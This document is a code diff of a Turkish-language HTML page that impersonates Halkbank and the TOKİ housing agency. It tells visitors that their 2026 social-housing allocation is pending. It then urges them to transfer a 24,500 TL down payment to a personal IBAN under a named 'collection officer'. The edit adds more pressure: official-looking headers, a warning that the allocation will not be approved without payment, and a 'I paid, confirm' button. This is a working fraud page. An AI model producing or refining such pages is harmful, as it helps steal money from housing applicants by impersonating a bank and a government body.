@@ -3,48 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TOKİ Peşinat Tahsilat Ekranı | HALKBANK</title>
-    <link rel="stylesheet" href="style.css">
+    <title>HALKBANK EMLAK KONUT GÜVENCESİ TOKİ</title>
     <style>
-        .official-badge { background: #004a99; color: white; padding: 5px 10px; border-radius: 4px; font-size: 12px; font-weight: bold; }
-        .iban-highlight { background: #fff8e1; border: 2px dashed #ffc107; padding: 15px; border-radius: 8px; margin: 15px 0; }
-        .name-style { font-size: 22px; color: #333; letter-spacing: 1px; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f4f7f9; margin: 0; padding: 0; }
+        .navbar { background-color: #004a99; color: white; padding: 18px; text-align: center; font-size: 16px; font-weight: bold; line-height: 1.4; border-bottom: 3px solid #003366; }
+        .sub-header { background-color: #c9302c; color: white; text-align: center; padding: 10px; font-size: 13px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
+        .container { max-width: 480px; margin: 20px auto; background: white; padding: 25px; border-radius: 15px; box-shadow: 0 8px 30px rgba(0,0,0,0.15); border: 1px solid #ddd; }
+        .status-box { background-color: #fff3cd; color: #856404; padding: 15px; border-radius: 8px; text-align: center; font-weight: bold; margin-bottom: 20px; border: 1px solid #ffeeba; border-left: 5px solid #ffc107; font-size: 14px; }
+        .info-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #eee; font-size: 14px; }
+        .payment-section { background: #fdfdfd; border: 2px dashed #004a99; padding: 20px; border-radius: 10px; margin-top: 20px; position: relative; }
+        .iban-box { background: #fff; border: 1px solid #ddd; padding: 15px; border-radius: 8px; margin: 15px 0; }
+        .label { font-size: 11px; color: #888; text-transform: uppercase; display: block; margin-bottom: 5px; }
+        .value-name { font-size: 22px; color: #222; font-weight: 900; display: block; margin-bottom: 12px; letter-spacing: 0.5px; }
+        .value-iban { font-size: 17px; color: #c9302c; font-family: 'Courier New', monospace; font-weight: bold; word-break: break-all; background: #f9f9f9; padding: 5px; border-radius: 4px; display: block; margin-bottom: 10px; }
+        .tahsis-no { background: #004a99; color: white; padding: 5px 12px; border-radius: 4px; font-weight: bold; font-family: monospace; font-size: 18px; }
+        .price-tag { font-size: 26px; color: #004a99; font-weight: 900; display: block; margin-top: 10px; }
+        .warning-footer { color: #c9302c; font-size: 14px; font-weight: 900; text-align: center; margin-top: 15px; padding: 12px; border: 2px solid #c9302c; border-radius: 5px; background: #fff5f5; }
+        button { width: 100%; background-color: #004a99; color: white; padding: 18px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 17px; margin-top: 20px; transition: 0.2s; }
+        .footer-text { font-size: 10px; color: #aaa; text-align: center; margin-top: 25px; line-height: 1.5; }
     </style>
 </head>
 <body>
-    <div class="navbar">HALKBANK | TOKİ Kurumsal Tahsilat Sistemi</div>
+    <div class="navbar">HALKBANK EMLAK KONUT GÜVENCESİ TOKİ</div>
+    <div class="sub-header">RESMİ KONUT TAHSİS VE PEŞİNAT ÖDEME PORTALI</div>
+
     <div class="container">
-        <div class="success-box">TEBRİKLER: 2026 SOSYAL KONUT TAHSİSİNİZ ONAYLANDI!</div>
+        <div class="status-box">DİKKAT: TAHSİS İŞLEMLERİNİN TAMAMLANMASI İÇİN PEŞİNAT ÖDEMESİ GERÇEKLEŞTİRİNİZ!</div>
         
-        <table class="info-table">
-            <tr><td><b>Hak Sahibi Durumu:</b></td><td><span class="official-badge">ASİL HAK SAHİBİ</span></td></tr>
-            <tr><td><b>Konut Tipi:</b></td><td>3+1 / 2+1 Karma Proje</td></tr>
-            <tr><td><b>Tahsis Onay Kodu:</b></td><td>TK-8842710</td></tr>
-        </table>
-        
-        <div class="payment-box">
-            <h3 style="color:#004a99; margin-top:0;">Tapu Tescil ve Peşinat Talimatı</h3>
-            <p style="font-size:14px;">Konutunuzun e-Devlet sisteminde adınıza tescil edilmesi için aşağıda belirtilen <b>Halkbank Lisanslı Tahsilat Yetkilisi</b> hesabına peşinat bedelinin yatırılması gerekmektedir.</p>
+        <div class="info-row"><span>Başvuru Durumu:</span> <b style="color:#d9534f;">ÖDEME BEKLENİYOR</b></div>
+        <div class="info-row"><span>Konut Tahsis No:</span> <b class="tahsis-no">TK-8842710</b></div>
+        <div class="info-row"><span>Tescil İşlemi:</span> <b>Tapu Tahsis Beklemede</b></div>
+
+        <div class="payment-section">
+            <h4 style="margin:0 0 10px 0; color:#004a99; text-align:center;">GÜVENCELİ TAHSİLAT BİLGİLERİ</h4>
+            <p style="font-size:12px; color:#555; text-align:center; margin-bottom:15px;">Aşağıdaki yetkili tahsilat hesabına peşinat yatırılmadığı sürece hak sahipliği onaylanmayacaktır.</p>
             
-            <div class="iban-highlight">
-                <span style="font-size: 11px; color: #666; text-transform: uppercase;">Tahsilat Birimi Sorumlusu:</span><br>
-                <b class="name-style">İSMAİL ARSLAN</b><br><br>
+            <div class="iban-box">
+                <span class="label">Tahsilat Birimi Yetkilisi:</span>
+                <span class="value-name">İSMAİL ARSLAN</span>
                 
-                <span style="font-size: 11px; color: #666; text-transform: uppercase;">Halkbank Kurumsal IBAN:</span><br>
-                <b style="font-size: 17px; color: #d9534f; font-family: monospace;">TR31 0006 7010 0000 0048 8523 29</b><br><br>
+                <span class="label">Resmi Halkbank IBAN Hesabı:</span>
+                <span class="value-iban">TR31 0006 7010 0000 0048 8523 29</span>
                 
-                <span style="font-size: 11px; color: #666; text-transform: uppercase;">Yatırılacak Toplam Tutar:</span><br>
-                <b style="font-size: 24px; color: #004a99;">24.500,00 TL</b>
+                <hr style="border:0; border-top:1px solid #eee; margin:15px 0;">
+                
+                <span class="label">Yatırılacak Kesin Peşinat Bedeli:</span>
+                <span class="price-tag">24.500,00 TL</span>
             </div>
             
-            <p class="warning">⚠️ ÖNEMLİ: EFT/Havale açıklama kısmına SADECE T.C. KİMLİK NUMARANIZI yazınız.</p>
+            <div class="warning-footer">
+                ⚠️ AÇIKLAMA KISMINA SADECE <br>
+                <span style="font-size:18px;">TK-8842710</span> <br>
+                YAZINIZ!
+            </div>
         </div>
+
+        <button onclick="alert('Ödemeniz sistem havuzuna düştükten sonra e-Devlet onayınız verilecektir. Lütfen dekontu saklayınız.')">ÖDEMEYİ YAPTIM, ONAYLA</button>
         
-        <p style="font-size:11px; color:#999; text-align:center; margin-top:15px; line-height:1.4;">
-            * Bu ödeme Halkbank Genel Müdürlüğü denetimindeki emanet hesaplara aktarılmaktadır. Ödeme sonrası 15 dakika içinde e-Devlet 'Tapu Bilgileri Sorgulama' ekranınız güncellenecektir.
-        </p>
-        
-        <button onclick="alert('Ödeme sistem tarafından sorgulanıyor... Lütfen transferi yaptıktan sonra sayfayı kapatmayınız.')">ÖDEMEYİ SİSTEME BİLDİR</button>
+        <div class="footer-text">
+            Bu portal Halkbank Emlak Konut ve TOKİ Finansman Dairesi işbirliği ile hazırlanmıştır. <br>
+            Tahsilat Yetkilisi: İSMAİL ARSLAN | İşlem Kodu: TK-8842710 <br>
+            © 2026 Tüm Hakları Saklıdır.
+        </div>
     </div>
 </body>
 </html>
